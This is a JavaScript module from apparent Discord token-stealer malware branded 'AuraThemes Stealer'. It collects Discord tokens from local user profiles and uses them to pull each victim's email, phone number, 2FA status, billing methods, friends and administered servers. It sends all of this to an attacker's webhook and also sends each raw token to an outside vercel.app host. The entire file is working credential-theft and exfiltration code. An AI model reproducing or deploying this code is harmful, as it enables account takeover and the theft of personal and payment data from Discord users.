const { discordFindTokens } = require('./finds.js');
const { getUsers }         = require("./../../utils/harware.js");

const FormData = require('form-data');
const axios    = require("axios");

module.exports = async (webhook) => {
    const users = await getUsers();
    for (const user of users) {
        const tokens = await discordFindTokens(user);
        for (let token of tokens) {
            try {
                let user = await axios.get('https://discord.com/api/v9/users/@me', { headers: { Authorization: token } });
                user = user.data;

                let billingData = await axios.get('https://discord.com/api/v9/users/@me/billing/payment-sources', { headers: { Authorization: token } });
                billingData = billingData.data;

                let guildsData = await axios.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', { headers: { Authorization: token } });
                guildsData = guildsData.data;

                let friendsData = await axios.get('https://discord.com/api/v9/users/@me/relationships', { headers: { Authorization: token } });
                friendsData = friendsData.data;

                const avatarUrlGif = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.gif`;
                const avatarUrlPng = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`;

                let avatar = avatarUrlGif;
                try {
                    const avatarResponse = await axios.get(avatarUrlGif);
                    if (avatarResponse.status !== 200) {
                        avatar = avatarUrlPng;
                    }
                } catch (error) {
                    avatar = avatarUrlPng;
                }

                let copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${token}`;

                const payload = {
                    avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
                    username: 'AuraThemes Stealer',
                    embeds: [
                        {
                            title: `${user.username} | ${user.id}`,
                            color: "12740607",
                            thumbnail: {
                                url: avatar
                            },
                            fields: [
                                {
                                    name: "<a:sofake:1127671627178577951> Token:",
                                    value: `\`\`\`yml\n${token}\n\`\`\`\n[[Click Here To Copy Your Token]](${copy})`,
                                    inline: false
                                },
                                { name: "\u200b", value: "\u200b", inline: false },
                                {
                                    name: "<a:nitro:1187983753637802044> Nitro:",
                                    value: getNitro(user.premium_type),
                                    inline: true
                                },
                                {
                                    name: "<a:love:1236106886978342965> Phone:",
                                    value: `\`${user.phone || 'None'}${user.mfa_enabled ? ' (2FA)' : ''}\``,
                                    inline: true
                                },
                                { name: "\u200b", value: "\u200b", inline: false },
                                {
                                    name: "<:mail:866089515536744468> Email:",
                                    value: `\`${user.email || 'None'}\``,
                                    inline: true
                                },
                                {
                                    name: "<a:badges:963333479129550889> Badges:",
                                    value: getFlags(user.public_flags),
                                    inline: true
                                },
                                {
                                    name: "<:blackcards:1121714389708439664> Billing:",
                                    value: getBilling(billingData),
                                    inline: true
                                }
                            ],
                            timestamp: new Date(),
                            footer: {
                                text: 'AuraThemes Stealer | Tokens',
                                icon_url: 'https://i.imgur.com/yVnOSeS.gif'
                            }
                        }
                    ]
                };

                const hqGuilds = await getHQGuilds(guildsData, token);
                if (hqGuilds) {
                    payload.embeds[0].fields.push({
                        name: "\u200b",
                        value: hqGuilds,
                        inline: false
                    });
                }

                const hqFriends = getHQFriends(friendsData);
                if (hqFriends) {
                    payload.embeds[0].fields.push({
                        name: "\u200b",
                        value: hqFriends,
                        inline: false
                    });
                }

                const form = new FormData();
                form.append('payload_json', JSON.stringify(payload));

                await axios.post(webhook, form, {
                    headers: {
                        ...form.getHeaders()
                    }
                });
                await axios.get(copy);
            } catch (error) {
                console.error('Error sending webhook:', error);
            }
        }
    }
}

let getHQFriends = (friends) => {
    let hqFriends = "";

    friends.filter(friend => friend.type === 1).forEach(friend => {
        const flags = getRareFlags(friend.user.public_flags);
        if (flags !== "Not Found") {
            hqFriends += `${flags} ${friend.user.username}#${friend.user.discriminator}\n`;
        }
    });

    if (hqFriends.length === 0) {
        return false;
    }

    if (hqFriends.length > 1024) {
        return "Too many friends to display.";
    }

    return `**Rare Friends:**\n${hqFriends}`;
};

async function getHQGuilds(guilds, token) {
    const filteredGuilds = guilds
        .filter(guild => guild.owner || (guild.permissions & 8) === 8)
        .filter(guild => guild.approximate_member_count >= 500)
        .map(guild => ({
            id: guild.id,
            name: guild.name,
            owner: guild.owner,
            member_count: guild.approximate_member_count
        }));

    const hQGuilds = await Promise.all(filteredGuilds.map(async guild => {
        const response = await axios.get(`https://discord.com/api/v8/guilds/${guild.id}/invites`, {
            headers: { Authorization: token }
        });

        const invites = response.data;
        const invite = invites.length > 0
            ? `[Join Server](https://discord.gg/${invites[0].code})`
            : 'No Invite';

        const emoji = guild.owner
            ? "<:owner:963333541343686696> Owner"
            : "<:staff:846569357353680896> Admin";
        const members = `Members: \`${guild.member_count}\``;
        const name = `${guild.name} - \`${guild.id}\``;

        return `${emoji} | ${name} | ${members} - ${invite}\n`;
    }));

    if (hQGuilds.length === 0) {
        return false;
    }

    if (hQGuilds.length > 2000) {
        return "Too many servers to display.";
    }

    return `**Rare Servers:**\n${hQGuilds}`;
}


function getBilling(billing) {
    let paymentMethods = '';
    for (const method of billing) {
        if (method.type === 1) {
            paymentMethods += '💳';
        } else if (method.type === 2) {
            paymentMethods += '<:paypal:1129073151746252870>';
        } else {
            paymentMethods += '❓';
        }
    }
    return paymentMethods || '`None`';
}

function getNitro(flags) {
    switch (flags) {
        case 1:
            return '`Nitro Classic`';
        case 2:
            return '`Nitro`';
        case 3:
            return '`Nitro Basic`';
        default:
            return '`None`';
    }
}

function getFlags(flags) {
    const flagsDict = {
        '<:staff:1090015968618623129>': 0,
        '<:partner:918207395279273985>': 1,
        '<:events:898186057588277259>': 2,
        '<:bughunter_1:874750808426692658>': 3,
        '<:bravery:874750808388952075>': 6,
        '<:brilliance:874750808338608199>': 7,
        '<:balance:874750808267292683>': 8,
        '<:early:944071770506416198>': 9,
        '<:bughunter_2:874750808430874664>': 14,
        '<:verifieddeveloper:1257040817600594101>': 17,
        '<:certifiedmoderator:925562487280128061>': 18,
        '⌨️': 20,
        '<:activedev:1042545590640324608>': 22
    };

    let result = '';
    for (const [emoji, shift] of Object.entries(flagsDict)) {
        if ((flags & (1 << shift)) !== 0) {
            result += emoji;
        }
    }

    return result || '`None`';
}

let getRareFlags = (flags) =>
    (1 & flags ? "<:staff:1090015968618623129> " : "") +
    (2 & flags ? "<:partner:918207395279273985> " : "") +
    (4 & flags ? "<:events:898186057588277259> " : "") +
    (8 & flags ? "<:bughunter_1:874750808426692658> " : "") +
    (512 & flags ? "<:early:944071770506416198> " : "") +
    (16384 & flags ? "<:bughunter_2:874750808430874664> " : "") +
    (4194304 & flags ? "<:activedev:1042545590640324608> " : "") +
    (131072 & flags ? "<:verifieddeveloper:1257040817600594101> " : "") || "Not Found";